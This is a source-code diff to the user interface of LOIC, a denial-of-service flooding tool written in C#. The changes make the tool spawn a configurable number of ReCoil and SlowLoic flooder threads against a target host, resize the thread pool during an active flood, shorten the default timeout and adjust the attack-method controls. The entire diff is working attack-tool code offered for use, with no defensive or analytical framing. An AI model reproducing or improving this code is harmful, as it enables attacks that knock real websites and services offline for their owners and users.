@@ -112,6 +112,7 @@ namespace LOIC
                 //let's lock down the controls, that could actually change the creation of new sockets
                 chkUsegZip.Enabled = false;
                 chkUseGet.Enabled = false;
+                chkMsgRandom.Enabled = false;
 
                 if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
                 {
@@ -142,16 +143,19 @@ namespace LOIC
                     }
                     lLoic.Clear();
                     cHLDos ts;
-                    if (iProtocol == 5)
+                    for (int i = 0; i < iThreads; i++)
                     {
-                        ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
+                        if (iProtocol == 5)
+                        {
+                            ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, chkResp.Checked, iSockspThread, chkUsegZip.Checked);
+                        }
+                        else
+                        {
+                            ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+                        }
+                        ts.start();
+                        lLoic.Add(ts);
                     }
-                    else
-                    {
-                        ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked , chkUsegZip.Checked );
-                    }
-                    ts.start();
-                    lLoic.Add(ts);
                 }
 
                 tShowStats.Start();
@@ -161,6 +165,7 @@ namespace LOIC
                 cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
                 chkUsegZip.Enabled = true;
                 chkUseGet.Enabled = true;
+                chkMsgRandom.Enabled = true;
                 if (xxp != null)
                 {
                     for (int a = 0; a < xxp.Length; a++)
@@ -584,7 +589,7 @@ namespace LOIC
                     {
                         txtTargetIP.Text = "";
                         txtTargetURL.Text ="";
-                        txtTimeout.Text = "9001";
+                        txtTimeout.Text = "30";
                         txtSubsite.Text = "/";
                         txtData.Text = "U dun goofed";
                         txtPort.Text = "80";
@@ -685,8 +690,7 @@ namespace LOIC
                         iDownloaded += http[a].Downloaded;
                         iRequested += http[a].Requested;
                         iFailed += http[a].Failed;
-                        if (http[a].State == HTTPFlooder.ReqState.Ready ||
-                            http[a].State == HTTPFlooder.ReqState.Completed)
+                        if (http[a].State == HTTPFlooder.ReqState.Completed)
                             iIdle++;
                         if (http[a].State == HTTPFlooder.ReqState.Connecting)
                             iConnecting++;
@@ -715,7 +719,7 @@ namespace LOIC
                         iDownloaded += lLoic[a].Downloaded;
                         iRequested += lLoic[a].Requested;
                         iFailed += lLoic[a].Failed;
-                        if ((lLoic[a].State == cHLDos.ReqState.Ready) || (lLoic[a].State == cHLDos.ReqState.Completed))
+                        if (lLoic[a].State == cHLDos.ReqState.Completed)
                             iIdle++;
                         if (lLoic[a].State == cHLDos.ReqState.Connecting)
                             iConnecting++;
@@ -731,7 +735,7 @@ namespace LOIC
                             cHLDos ts;
                             if (iProtocol == 5)
                             {
-                                ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
+                                ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, chkResp.Checked, iSockspThread, chkUsegZip.Checked);
                             }
                             else
                             {
@@ -743,19 +747,30 @@ namespace LOIC
                             lLoic.Add(ts);
                         }
                     }
-                    if (isFlooding && (lLoic.Count < iThreads) && (!lLoic[lLoic.Count - 1].IsDelayed))
+                    if (isFlooding)
                     {
-                        cHLDos ts;
-                        if (iProtocol == 5)
+                        if (lLoic.Count < iThreads)
                         {
-                            ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
+                            cHLDos ts;
+                            if (iProtocol == 5)
+                            {
+                                ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, chkResp.Checked, iSockspThread, chkUsegZip.Checked);
+                            }
+                            else
+                            {
+                                ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+                            }
+                            ts.start();
+                            lLoic.Add(ts);
                         }
-                        else
+                        else if (lLoic.Count > iThreads)
                         {
-                            ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+                            for (int a = (lLoic.Count - 1); a >= iThreads; a--)
+                            {
+                                lLoic[a].stop();
+                                lLoic.RemoveAt(a);
+                            }
                         }
-                        ts.start();
-                        lLoic.Add(ts);
                     }
                 }
 				lbFailed.Text = iFailed.ToString();
@@ -1034,7 +1049,7 @@ namespace LOIC
                             txtTargetURL.Text = "";
                             break;
                         case "timeout":
-                            txtTimeout.Text = "9001";
+                            txtTimeout.Text = "30";
                             break;
                         case "subsite":
                             txtSubsite.Text = "/";
@@ -1288,7 +1303,6 @@ namespace LOIC
 
         private void frmMain_KeyDown(object sender, KeyEventArgs e)
         {
-            
             switch (e.KeyCode)
             {
                 case Keys.F10:
@@ -1316,28 +1330,23 @@ namespace LOIC
 
         private void cbMethod_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (cbMethod.SelectedIndex > 2)
-            {
-                if (cbMethod.SelectedItem.ToString() == "slowLOIC")
-                {
-                    chkUseGet.Enabled = true;
-                }
-                chkUsegZip.Enabled = true;
-                txtSLSpT.Enabled = true;
-                chkResp.Enabled = false;
-            }
-            else
-            {
-                if (cbMethod.SelectedItem.ToString() == "HTTP")
-                    chkUsegZip.Enabled = true;
-                txtSLSpT.Enabled = false;
-                chkUseGet.Enabled = false;
-                chkUsegZip.Enabled = false;
-                chkResp.Enabled = true;
-            }
-
+            txtSLSpT.Enabled = (cbMethod.SelectedIndex >= 3) ? true : false;
+            chkUsegZip.Enabled = (cbMethod.SelectedIndex >= 2) ? true : false;
+            chkResp.Enabled = (cbMethod.SelectedIndex == 4) ? false : true;
+            chkUseGet.Enabled = (cbMethod.SelectedIndex == 4) ? true : false;
         }
 
+        private void txtThreads_Leave(object sender, EventArgs e)
+        {
+            if (cmdAttack.Text == "Stop flooding")
+            {
+                int num = iThreads;
+                if (int.TryParse(txtThreads.Text, out num))
+                {
+                    iThreads = num;
+                }
+            }
+        }
 
 	}
 }
